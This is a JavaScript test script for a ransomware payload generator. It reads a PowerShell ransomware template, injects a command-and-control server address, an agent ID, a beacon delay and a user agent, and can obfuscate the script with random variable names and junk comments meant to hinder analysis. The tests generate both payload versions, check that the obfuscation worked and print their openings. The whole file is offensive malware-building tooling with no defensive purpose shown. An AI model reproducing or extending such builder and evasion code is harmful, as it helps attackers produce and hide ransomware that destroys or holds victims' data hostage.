const fs = require('fs').promises;
const path = require('path');

// Simple implementation of our payload generation and obfuscation functions for testing

// Template path for the ransomware PowerShell script
const TEMPLATE_PATH = path.join(__dirname, 'templates/ransomware/template.ps1');

/**
 * Comprehensive obfuscation function to make the PowerShell script harder to analyze
 * @param {string} script - The PowerShell script to obfuscate
 * @returns {string} Obfuscated PowerShell script
 */
function obfuscateScript(script) {
  // Obfuscation techniques:
  // 1. Variable renaming with random names
  // 2. String encoding (Base64)
  // 3. Command substitution
  // 4. Insertion of random comments
  
  // Generate a random variable name
  const generateRandomVarName = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < Math.floor(Math.random() * 10) + 5; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };
  
  // Add random comments to make analysis harder
  const addRandomComments = (script) => {
    const comments = [
      '<# This is a placeholder comment #>',
      '<# Random comment for obfuscation #>',
      '<# Another meaningless comment #>',
      '<# Obfuscation in progress... #>'
    ];
    
    let result = script;
    const lines = result.split('\n');
    const newLines = [];
    
    for (let i = 0; i < lines.length; i++) {
      newLines.push(lines[i]);
      // Randomly insert comments (20% chance per line)
      if (Math.random() < 0.2) {
        const randomComment = comments[Math.floor(Math.random() * comments.length)];
        newLines.push(randomComment);
      }
    }
    
    return newLines.join('\n');
  };
  
  // Rename common variables with random names
  let obfuscatedScript = script;
  
  // List of common variables to rename
  const commonVars = ['$xzvcv', '$cxzvz', '$vczxv', '$zxcvx'];
  
  // Create mapping of old variable names to new random names
  const varMapping = {};
  commonVars.forEach(varName => {
    varMapping[varName] = generateRandomVarName();
  });
  
  // Replace variable names
  for (const [oldName, newName] of Object.entries(varMapping)) {
    const varRegex = new RegExp(`\\${oldName}`, 'g');
    obfuscatedScript = obfuscatedScript.replace(varRegex, `$${newName}`);
  }
  
  // Add random comments
  obfuscatedScript = addRandomComments(obfuscatedScript);
  
  // Return obfuscated script
  return obfuscatedScript;
}

/**
 * Generate a ransomware payload based on campaign configuration
 * @param {Object} config - Campaign configuration from frontend
 * @returns {string} Generated PowerShell script
 */
async function generateRansomwarePayload(config) {
  try {
    // Read the template file
    let template = await fs.readFile(TEMPLATE_PATH, 'utf8');
    
    // Generate a unique agent ID if not provided
    const agentId = config.agentId || 'test-agent-id';
    
    // Replace placeholders in the template
    template = template.replace(/\$xzvcv = \$null/g, `$xzvcv = "${config.c2Server || 'http://localhost:8080'}"`);
    template = template.replace(/\$cxzvz = \$null/g, `$cxzvz = "${agentId}"`);
    template = template.replace(/\$vczxv = 0/g, `$vczxv = ${config.delay || 30}`);
    
    // Handle user agent if provided
    if (config.userAgent) {
      template = template.replace(/\$zxcvx = \$null/g, `$zxcvx = "${config.userAgent}"`);
    }
    
    // Apply obfuscation if requested
    if (config.obfuscate) {
      template = obfuscateScript(template);
    }
    
    // Add any additional configuration parameters here
    // For example, ransom note, file extensions, etc.
    
    return template;
  } catch (error) {
    throw new Error(`Failed to generate ransomware payload: ${error.message}`);
  }
}

async function testFullFlow() {
  try {
    console.log('Testing full ransomware payload generation flow...');
    
    // Test 1: Basic payload generation without obfuscation
    console.log('\n=== Test 1: Basic payload generation ===');
    const basicConfig = {
      mode: 'fire_forget',
      payloadType: 'ps1',
      c2Server: 'http://test-server:8080',
      delay: 45,
      userAgent: 'Test-Agent/1.0',
      agentId: 'test-123'
    };
    
    const basicPayload = await generateRansomwarePayload(basicConfig);
    console.log('SUCCESS: Basic payload generated');
    console.log('Size:', basicPayload.length, 'characters');
    
    // Test 2: Payload generation with obfuscation
    console.log('\n=== Test 2: Payload generation with obfuscation ===');
    const obfuscatedConfig = {
      mode: 'fire_forget',
      payloadType: 'ps1',
      c2Server: 'http://test-server:8080',
      delay: 45,
      userAgent: 'Test-Agent/1.0',
      agentId: 'test-123',
      obfuscate: true
    };
    
    const obfuscatedPayload = await generateRansomwarePayload(obfuscatedConfig);
    console.log('SUCCESS: Obfuscated payload generated');
    console.log('Size:', obfuscatedPayload.length, 'characters');
    
    // Verify obfuscation worked
    if (obfuscatedPayload.length > basicPayload.length) {
      console.log('SUCCESS: Obfuscated payload is larger than basic payload');
    } else {
      console.log('WARNING: Obfuscated payload size is not larger');
    }
    
    // Check if original variables are still present in obfuscated version
    const originalVars = ['$xzvcv', '$cxzvz', '$vczxv', '$zxcvx'];
    let varsFound = false;
    for (const varName of originalVars) {
      if (obfuscatedPayload.includes(varName)) {
        console.log(`WARNING: Original variable ${varName} found in obfuscated payload`);
        varsFound = true;
      }
    }
    
    if (!varsFound) {
      console.log('SUCCESS: All original variables were obfuscated');
    }
    
    // Show first 500 characters of both payloads for comparison
    console.log('\nFirst 500 characters of basic payload:');
    console.log(basicPayload.substring(0, 500));
    
    console.log('\nFirst 500 characters of obfuscated payload:');
    console.log(obfuscatedPayload.substring(0, 500));
    
    console.log('\n=== All tests completed successfully ===');
    
  } catch (error) {
    console.error('Test failed with error:', error);
  }
}

testFullFlow();
